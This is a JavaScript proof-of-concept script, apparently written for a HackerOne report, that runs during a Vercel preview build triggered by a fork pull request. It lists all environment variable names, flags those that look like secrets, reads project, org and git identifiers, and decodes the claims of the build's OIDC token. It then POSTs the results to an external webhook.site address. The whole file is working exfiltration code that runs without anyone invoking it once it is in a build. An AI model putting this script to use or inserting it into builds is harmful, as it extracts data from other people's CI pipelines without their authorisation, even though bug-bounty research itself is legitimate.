// Build-environment probe for HackerOne report #4086036.
// Runs during the Vercel BUILD of the fork-PR preview deployment.
// Destination: the researcher's own webhook.site inbox.
// Only variable NAMES and OIDC claim metadata are sent — never secret values.
const WEBHOOK = "https://webhook.site/a72ec3e3-e006-423e-bf2d-333bccfc0392";

function decodeClaims(token) {
  try {
    const part = token.split(".")[1];
    return JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
  } catch {
    return null;
  }
}

const names = Object.keys(process.env).sort();
const sensitive = names.filter((n) => /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|OIDC/i.test(n));
const token = process.env.VERCEL_OIDC_TOKEN ?? "NOT_AVAILABLE";
const claims = token === "NOT_AVAILABLE" ? null : decodeClaims(token);

const report = {
  phase: "build-env",
  envVarCount: names.length,
  envVarNames: names,
  sensitiveNameMatches: sensitive,
  marker: {
    VERCEL: process.env.VERCEL ?? "NOT_SET",
    VERCEL_ENV: process.env.VERCEL_ENV ?? "NOT_SET",
    VERCEL_TARGET_ENV: process.env.VERCEL_TARGET_ENV ?? "NOT_SET",
    VERCEL_PROJECT_ID: process.env.VERCEL_PROJECT_ID ?? "NOT_SET",
    VERCEL_ORG_ID: process.env.VERCEL_ORG_ID ?? "NOT_SET",
    VERCEL_URL: process.env.VERCEL_URL ?? "NOT_SET",
    VERCEL_GIT_REPO_OWNER: process.env.VERCEL_GIT_REPO_OWNER ?? "NOT_SET",
    VERCEL_GIT_REPO_SLUG: process.env.VERCEL_GIT_REPO_SLUG ?? "NOT_SET",
    VERCEL_GIT_COMMIT_REF: process.env.VERCEL_GIT_COMMIT_REF ?? "NOT_SET",
    VERCEL_GIT_PULL_REQUEST_ID: process.env.VERCEL_GIT_PULL_REQUEST_ID ?? "NOT_SET",
    CI: process.env.CI ?? "NOT_SET"
  },
  oidc: {
    present: token !== "NOT_AVAILABLE",
    length: token === "NOT_AVAILABLE" ? 0 : token.length,
    claims
  },
  timestamp: new Date().toISOString()
};

// Names / markers only — no secret values reach the build log.
console.log("=== OIDC BUILD-ENV PROBE (HackerOne 4086036) ===");
console.log("env var count   :", report.envVarCount);
console.log("env var names   :", JSON.stringify(report.envVarNames));
console.log("marker          :", JSON.stringify(report.marker));
console.log("oidc present    :", report.oidc.present);
console.log("oidc claims     :", JSON.stringify(report.oidc.claims));
console.log("=== END PROBE ===");

try {
  const response = await fetch(WEBHOOK, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(report),
    signal: AbortSignal.timeout(10_000)
  });
  console.log("probe post status:", response.status);
} catch (error) {
  console.log("probe post failed:", String(error));
}
